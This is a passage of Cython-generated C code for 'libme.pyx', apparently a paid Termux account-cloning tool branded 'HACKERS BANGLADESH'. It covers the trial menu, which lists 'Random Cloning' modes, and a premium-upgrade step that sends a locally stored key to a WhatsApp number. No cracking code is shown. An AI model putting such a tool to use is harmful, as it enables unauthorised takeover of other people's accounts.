 * 			else:
 */
      goto __pyx_L12;
    }

    /* "libme.pyx":125
 * 				self.__login__()
 * 			else:
 * 				James().__start__()             # <<<<<<<<<<<<<<
 * 		elif "Trial" in status:
 * 			print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */
    /*else*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_James); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 125, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_1, function);
        }
      }
      __pyx_t_7 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 125, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_start); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 125, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_1);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_1, function);
        }
      }
      __pyx_t_2 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 125, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    }
    __pyx_L12:;

    /* "libme.pyx":99
 * 			status = "Trial"
 * 			expired = "you are not registered"
 * 		if "Premium" in status:             # <<<<<<<<<<<<<<
 * 			print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 			print ("\033[1;92m  [] T-Date  : %s "%(date))
 */
    goto __pyx_L11;
  }

  /* "libme.pyx":126
 * 			else:
 * 				James().__start__()
 * 		elif "Trial" in status:             # <<<<<<<<<<<<<<
 * 			print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 			print ("\033[1;92m  [] T-Date  : %s "%(date))
 */
  __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_Trial, __pyx_v_status, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 126, __pyx_L1_error)
  __pyx_t_10 = (__pyx_t_11 != 0);
  if (__pyx_t_10) {

    /* "libme.pyx":127
 * 				James().__start__()
 * 		elif "Trial" in status:
 * 			print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")             # <<<<<<<<<<<<<<
 * 			print ("\033[1;92m  [] T-Date  : %s "%(date))
 * 			print ("  [] Your ip : %s "%(ip))
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_1_92m_____1_92m_1_92m) < 0) __PYX_ERR(0, 127, __pyx_L1_error)

    /* "libme.pyx":128
 * 		elif "Trial" in status:
 * 			print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 			print ("\033[1;92m  [] T-Date  : %s "%(date))             # <<<<<<<<<<<<<<
 * 			print ("  [] Your ip : %s "%(ip))
 * 			print ("  [] Expired : %s "%(expired))
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_date); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 128, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_1 = __Pyx_PyString_FormatSafe(__pyx_kp_s_1_92m_T_Date_s, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 128, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (__Pyx_PrintOne(0, __pyx_t_1) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":129
 * 			print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 			print ("\033[1;92m  [] T-Date  : %s "%(date))
 * 			print ("  [] Your ip : %s "%(ip))             # <<<<<<<<<<<<<<
 * 			print ("  [] Expired : %s "%(expired))
 * 			print ("  [] Status  : \033[0;31mTrail/Free\033[1;0m")
 */
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ip); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 129, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Your_ip_s, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 129, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (__Pyx_PrintOne(0, __pyx_t_2) < 0) __PYX_ERR(0, 129, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "libme.pyx":130
 * 			print ("\033[1;92m  [] T-Date  : %s "%(date))
 * 			print ("  [] Your ip : %s "%(ip))
 * 			print ("  [] Expired : %s "%(expired))             # <<<<<<<<<<<<<<
 * 			print ("  [] Status  : \033[0;31mTrail/Free\033[1;0m")
 * 			print("\n  [1]\x1b[1;92m 2009 Random Cloning\033[0;97m (Mbasic)")
 */
    __pyx_t_2 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Expired_s, __pyx_v_expired); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (__Pyx_PrintOne(0, __pyx_t_2) < 0) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "libme.pyx":131
 * 			print ("  [] Your ip : %s "%(ip))
 * 			print ("  [] Expired : %s "%(expired))
 * 			print ("  [] Status  : \033[0;31mTrail/Free\033[1;0m")             # <<<<<<<<<<<<<<
 * 			print("\n  [1]\x1b[1;92m 2009 Random Cloning\033[0;97m (Mbasic)")
 * 			print("  [2]\x1b[1;92m 2008 to 2010  Random Cloning\033[0;97m (free)")
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_Status_0_31mTrail_Free_1_0m) < 0) __PYX_ERR(0, 131, __pyx_L1_error)

    /* "libme.pyx":132
 * 			print ("  [] Expired : %s "%(expired))
 * 			print ("  [] Status  : \033[0;31mTrail/Free\033[1;0m")
 * 			print("\n  [1]\x1b[1;92m 2009 Random Cloning\033[0;97m (Mbasic)")             # <<<<<<<<<<<<<<
 * 			print("  [2]\x1b[1;92m 2008 to 2010  Random Cloning\033[0;97m (free)")
 * 			print("  [3]\x1b[1;92m 2005 Random Cloning\033[0;97m (B-api)")
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_1_1_92m_2009_Random_Cloning_0_9) < 0) __PYX_ERR(0, 132, __pyx_L1_error)

    /* "libme.pyx":133
 * 			print ("  [] Status  : \033[0;31mTrail/Free\033[1;0m")
 * 			print("\n  [1]\x1b[1;92m 2009 Random Cloning\033[0;97m (Mbasic)")
 * 			print("  [2]\x1b[1;92m 2008 to 2010  Random Cloning\033[0;97m (free)")             # <<<<<<<<<<<<<<
 * 			print("  [3]\x1b[1;92m 2005 Random Cloning\033[0;97m (B-api)")
 * 			print("  [4]\x1b[1;92m 2004 Random Cloning\033[0;97m (B-api)")
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_2_1_92m_2008_to_2010_Random_Clo) < 0) __PYX_ERR(0, 133, __pyx_L1_error)

    /* "libme.pyx":134
 * 			print("\n  [1]\x1b[1;92m 2009 Random Cloning\033[0;97m (Mbasic)")
 * 			print("  [2]\x1b[1;92m 2008 to 2010  Random Cloning\033[0;97m (free)")
 * 			print("  [3]\x1b[1;92m 2005 Random Cloning\033[0;97m (B-api)")             # <<<<<<<<<<<<<<
 * 			print("  [4]\x1b[1;92m 2004 Random Cloning\033[0;97m (B-api)")
 * 			print("  [5]\x1b[1;92m File Cloning\033[0;97m (Login)")
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_3_1_92m_2005_Random_Cloning_0_9) < 0) __PYX_ERR(0, 134, __pyx_L1_error)

    /* "libme.pyx":135
 * 			print("  [2]\x1b[1;92m 2008 to 2010  Random Cloning\033[0;97m (free)")
 * 			print("  [3]\x1b[1;92m 2005 Random Cloning\033[0;97m (B-api)")
 * 			print("  [4]\x1b[1;92m 2004 Random Cloning\033[0;97m (B-api)")             # <<<<<<<<<<<<<<
 * 			print("  [5]\x1b[1;92m File Cloning\033[0;97m (Login)")
 * 			print("  [6]\x1b[1;92m Upgrade To \x1b[0;32mPremium\x1b[0;37m")
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_4_1_92m_2004_Random_Cloning_0_9) < 0) __PYX_ERR(0, 135, __pyx_L1_error)

    /* "libme.pyx":136
 * 			print("  [3]\x1b[1;92m 2005 Random Cloning\033[0;97m (B-api)")
 * 			print("  [4]\x1b[1;92m 2004 Random Cloning\033[0;97m (B-api)")
 * 			print("  [5]\x1b[1;92m File Cloning\033[0;97m (Login)")             # <<<<<<<<<<<<<<
 * 			print("  [6]\x1b[1;92m Upgrade To \x1b[0;32mPremium\x1b[0;37m")
 * 			choose = input("\n  [] Select One : ")
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_5_1_92m_File_Cloning_0_97m_Logi) < 0) __PYX_ERR(0, 136, __pyx_L1_error)

    /* "libme.pyx":137
 * 			print("  [4]\x1b[1;92m 2004 Random Cloning\033[0;97m (B-api)")
 * 			print("  [5]\x1b[1;92m File Cloning\033[0;97m (Login)")
 * 			print("  [6]\x1b[1;92m Upgrade To \x1b[0;32mPremium\x1b[0;37m")             # <<<<<<<<<<<<<<
 * 			choose = input("\n  [] Select One : ")
 * 			if choose in [""]:
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_6_1_92m_Upgrade_To_0_32mPremium) < 0) __PYX_ERR(0, 137, __pyx_L1_error)

    /* "libme.pyx":138
 * 			print("  [5]\x1b[1;92m File Cloning\033[0;97m (Login)")
 * 			print("  [6]\x1b[1;92m Upgrade To \x1b[0;32mPremium\x1b[0;37m")
 * 			choose = input("\n  [] Select One : ")             # <<<<<<<<<<<<<<
 * 			if choose in [""]:
 * 				exit(" [!] \033[1;37m Warning : \033[0;97mYou Are Not Registered Yet, Please Choose Number 6")
 */
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 138, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_v_choose = __pyx_t_2;
    __pyx_t_2 = 0;

    /* "libme.pyx":139
 * 			print("  [6]\x1b[1;92m Upgrade To \x1b[0;32mPremium\x1b[0;37m")
 * 			choose = input("\n  [] Select One : ")
 * 			if choose in [""]:             # <<<<<<<<<<<<<<
 * 				exit(" [!] \033[1;37m Warning : \033[0;97mYou Are Not Registered Yet, Please Choose Number 6")
 * 				input("  [] Return menu")
 */
    __Pyx_INCREF(__pyx_v_choose);
    __pyx_t_2 = __pyx_v_choose;
    __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 139, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_11 = (__pyx_t_10 != 0);
    if (__pyx_t_11) {

      /* "libme.pyx":140
 * 			choose = input("\n  [] Select One : ")
 * 			if choose in [""]:
 * 				exit(" [!] \033[1;37m Warning : \033[0;97mYou Are Not Registered Yet, Please Choose Number 6")             # <<<<<<<<<<<<<<
 * 				input("  [] Return menu")
 * 				self.__start__()
 */
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__5, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 140, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":141
 * 			if choose in [""]:
 * 				exit(" [!] \033[1;37m Warning : \033[0;97mYou Are Not Registered Yet, Please Choose Number 6")
 * 				input("  [] Return menu")             # <<<<<<<<<<<<<<
 * 				self.__start__()
 * 			if choose in ["6", "06"]:
 */
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__6, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 141, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":142
 * 				exit(" [!] \033[1;37m Warning : \033[0;97mYou Are Not Registered Yet, Please Choose Number 6")
 * 				input("  [] Return menu")
 * 				self.__start__()             # <<<<<<<<<<<<<<
 * 			if choose in ["6", "06"]:
 * 				apikey = open(".__apikey__.log", "r").read()
 */
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_start); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 142, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_1);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_1, function);
        }
      }
      __pyx_t_2 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 142, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":139
 * 			print("  [6]\x1b[1;92m Upgrade To \x1b[0;32mPremium\x1b[0;37m")
 * 			choose = input("\n  [] Select One : ")
 * 			if choose in [""]:             # <<<<<<<<<<<<<<
 * 				exit(" [!] \033[1;37m Warning : \033[0;97mYou Are Not Registered Yet, Please Choose Number 6")
 * 				input("  [] Return menu")
 */
    }

    /* "libme.pyx":143
 * 				input("  [] Return menu")
 * 				self.__start__()
 * 			if choose in ["6", "06"]:             # <<<<<<<<<<<<<<
 * 				apikey = open(".__apikey__.log", "r").read()
 * 				os.system('am start https://wa.me/+96598064347?text=hello%20sir,%20I%20want%20to%20buy%20a%20premium%20script%20:%20' + apikey + ' >/dev/null')
 */
    __Pyx_INCREF(__pyx_v_choose);
    __pyx_t_2 = __pyx_v_choose;
    __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_6, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 143, __pyx_L1_error)
    if (!__pyx_t_10) {
    } else {
      __pyx_t_11 = __pyx_t_10;
      goto __pyx_L25_bool_binop_done;
    }
    __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_06, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 143, __pyx_L1_error)
    __pyx_t_11 = __pyx_t_10;
    __pyx_L25_bool_binop_done:;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_10 = (__pyx_t_11 != 0);
    if (__pyx_t_10) {

      /* "libme.pyx":144
 * 				self.__start__()
 * 			if choose in ["6", "06"]:
 * 				apikey = open(".__apikey__.log", "r").read()             # <<<<<<<<<<<<<<
 * 				os.system('am start https://wa.me/+96598064347?text=hello%20sir,%20I%20want%20to%20buy%20a%20premium%20script%20:%20' + apikey + ' >/dev/null')
 * 				exit("\n [!] \033[1;31m Warning : \033[0;37m Don't Run The Tools If You Haven't Registered With Admin...")
 */
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 144, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_read); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 144, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_2 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 144, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_apikey = __pyx_t_2;
      __pyx_t_2 = 0;

      /* "libme.pyx":145
 * 			if choose in ["6", "06"]:
 * 				apikey = open(".__apikey__.log", "r").read()
 * 				os.system('am start https://wa.me/+96598064347?text=hello%20sir,%20I%20want%20to%20buy%20a%20premium%20script%20:%20' + apikey + ' >/dev/null')             # <<<<<<<<<<<<<<
 * 				exit("\n [!] \033[1;31m Warning : \033[0;37m Don't Run The Tools If You Haven't Registered With Admin...")
 * 			else:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_os); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 145, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_system); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 145, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyNumber_Add(__pyx_kp_s_am_start_https_wa_me_96598064347, __pyx_v_apikey); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 145, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_3 = PyNumber_Add(__pyx_t_7, __pyx_kp_s_dev_null); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 145, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_1);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_1, function);
        }
      }
      __pyx_t_2 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_7, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 145, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":146
 * 				apikey = open(".__apikey__.log", "r").read()
 * 				os.system('am start https://wa.me/+96598064347?text=hello%20sir,%20I%20want%20to%20buy%20a%20premium%20script%20:%20' + apikey + ' >/dev/null')
 * 				exit("\n [!] \033[1;31m Warning : \033[0;37m Don't Run The Tools If You Haven't Registered With Admin...")             # <<<<<<<<<<<<<<
 * 			else:
 * 				exit("  [!] \033[1;31m Warning : \033[1;37m You Are Not Registered Yet, Please Choose Number 6")
 */
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__7, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 146, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":143
 * 				input("  [] Return menu")
 * 				self.__start__()
 * 			if choose in ["6", "06"]:             # <<<<<<<<<<<<<<
 * 				apikey = open(".__apikey__.log", "r").read()
 * 				os.system('am start https://wa.me/+96598064347?text=hello%20sir,%20I%20want%20to%20buy%20a%20premium%20script%20:%20' + apikey + ' >/dev/null')
 */
      goto __pyx_L24;
    }

    /* "libme.pyx":148
 * 				exit("\n [!] \033[1;31m Warning : \033[0;37m Don't Run The Tools If You Haven't Registered With Admin...")
 * 			else:
 * 				exit("  [!] \033[1;31m Warning : \033[1;37m You Are Not Registered Yet, Please Choose Number 6")             # <<<<<<<<<<<<<<
 * 	def __fb__(self):
 * 		x = 11111111
 */
    /*else*/ {
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__8, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    }
    __pyx_L24:;

    /* "libme.pyx":126
 * 			else:
 * 				James().__start__()
 * 		elif "Trial" in status:             # <<<<<<<<<<<<<<
 * 			print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 			print ("\033[1;92m  [] T-Date  : %s "%(date))
 */
  }
  __pyx_L11:;

  /* "libme.pyx":89
 * 			print( "  Talk To Admin For Key...\n")
